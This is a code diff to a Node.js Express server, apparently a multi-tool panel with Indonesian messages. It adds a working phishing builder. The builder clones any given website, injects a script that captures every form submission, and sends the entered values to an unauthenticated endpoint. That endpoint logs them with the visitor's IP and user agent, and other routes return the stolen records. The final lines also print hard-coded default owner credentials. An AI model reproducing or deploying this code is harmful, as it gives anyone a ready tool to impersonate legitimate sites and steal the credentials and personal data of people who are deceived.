@@ -900,6 +900,166 @@ app.get('/api/tools/anime/trending', authMiddleware, async (req, res) => {
   }
 });
 
+
+// ===== PHISHING BUILDER =====
+const PHISH_DIR = path.join(__dirname, 'public', 'phish');
+const PHISH_DATA_FILE = path.join(__dirname, 'phish-data.json');
+
+if (!fs.existsSync(PHISH_DIR)) fs.mkdirSync(PHISH_DIR, { recursive: true });
+
+function loadPhishData() {
+  if (!fs.existsSync(PHISH_DATA_FILE)) return [];
+  try { return JSON.parse(fs.readFileSync(PHISH_DATA_FILE, 'utf8')); }
+  catch (e) { return []; }
+}
+function savePhishData(data) {
+  fs.writeFileSync(PHISH_DATA_FILE, JSON.stringify(data.slice(-500), null, 2));
+}
+
+function slugifyUrl(url) {
+  try {
+    const u = new URL(url);
+    return u.hostname.replace(/[^a-z0-9]/gi, '_') + '_' + Date.now().toString(36);
+  } catch (e) {
+    return 'phish_' + Date.now().toString(36);
+  }
+}
+
+app.post('/api/phishing/create', authMiddleware, async (req, res) => {
+  try {
+    const { url } = req.body || {};
+    if (!url) return res.json({ ok: false, msg: 'URL kosong' });
+    if (!url.startsWith('http')) return res.json({ ok: false, msg: 'URL harus http/https' });
+
+    const r = await axios.get(url, {
+      timeout: 20000,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5'
+      },
+      maxRedirects: 5
+    });
+
+    let html = r.data;
+    if (typeof html !== 'string') html = JSON.stringify(html);
+
+    const slug = slugifyUrl(url);
+    const targetDir = path.join(PHISH_DIR, slug);
+    fs.mkdirSync(targetDir, { recursive: true });
+
+    try {
+      const parsed = new URL(url);
+      const origin = parsed.origin;
+      html = html.replace(/(src|href|action|data-src)="(\/[^"]*)"/g, function(m, attr, pathv) {
+        return attr + '="' + origin + pathv + '"';
+      });
+      if (html.indexOf('<base') === -1) {
+        html = html.replace(/<head([^>]*)>/i, '<head$1><base href="' + origin + '/">');
+      }
+    } catch (e) {}
+
+    const captureScript = '<script src="/phish/' + slug + '/phish-capture.js"></script>';
+    if (html.indexOf('</body>') !== -1) {
+      html = html.replace('</body>', captureScript + '</body>');
+    } else {
+      html += captureScript;
+    }
+
+    fs.writeFileSync(path.join(targetDir, 'index.html'), html);
+
+    const captureJS = `(function(){
+  function getSlug() { return '` + slug + `'; }
+  document.addEventListener('DOMContentLoaded', function() {
+    var forms = document.querySelectorAll('form');
+    forms.forEach(function(form) {
+      form.addEventListener('submit', function(e) {
+        var data = {};
+        var inputs = form.querySelectorAll('input, textarea, select');
+        inputs.forEach(function(inp) {
+          if (inp.name) data[inp.name] = inp.value;
+          else if (inp.type === 'email' || inp.type === 'text' || inp.id) data[inp.id || inp.type] = inp.value;
+        });
+        try {
+          fetch('/api/phishing/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              slug: getSlug(),
+              url: window.location.href,
+              data: data,
+              ua: navigator.userAgent,
+              time: new Date().toISOString()
+            })
+          }).catch(function(){});
+        } catch (err) {}
+      });
+    });
+  });
+})();`;
+    fs.writeFileSync(path.join(targetDir, 'phish-capture.js'), captureJS);
+
+    res.json({ ok: true, slug: slug, url: '/phish/' + slug + '/index.html', target: url, msg: 'Phishing page berhasil dibuat' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.post('/api/phishing/capture', (req, res) => {
+  try {
+    const body = req.body || {};
+    if (!body.slug || !body.data) return res.json({ ok: false });
+    const records = loadPhishData();
+    records.push({
+      slug: body.slug,
+      url: body.url || '',
+      data: body.data,
+      ua: body.ua || '',
+      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
+      time: body.time || new Date().toISOString()
+    });
+    savePhishData(records);
+    res.json({ ok: true });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.get('/api/phishing/list', authMiddleware, (req, res) => {
+  try {
+    const items = [];
+    if (fs.existsSync(PHISH_DIR)) {
+      fs.readdirSync(PHISH_DIR).forEach(function(dir) {
+        const fullPath = path.join(PHISH_DIR, dir);
+        if (fs.statSync(fullPath).isDirectory()) {
+          items.push({ slug: dir, url: '/phish/' + dir + '/index.html' });
+        }
+      });
+    }
+    res.json({ ok: true, items: items });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.get('/api/phishing/data', authMiddleware, (req, res) => {
+  try {
+    const data = loadPhishData();
+    res.json({ ok: true, data: data.reverse() });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
+app.delete('/api/phishing/data', authMiddleware, (req, res) => {
+  try {
+    savePhishData([]);
+    res.json({ ok: true, msg: 'Data dihapus' });
+  } catch (e) {
+    res.json({ ok: false, msg: e.message });
+  }
+});
+
 server.listen(3000, () => {
   console.log('[XYREX] Server jalan di http://localhost:3000');
   console.log('[XYREX] Owner default: Dlizz / 20111608');
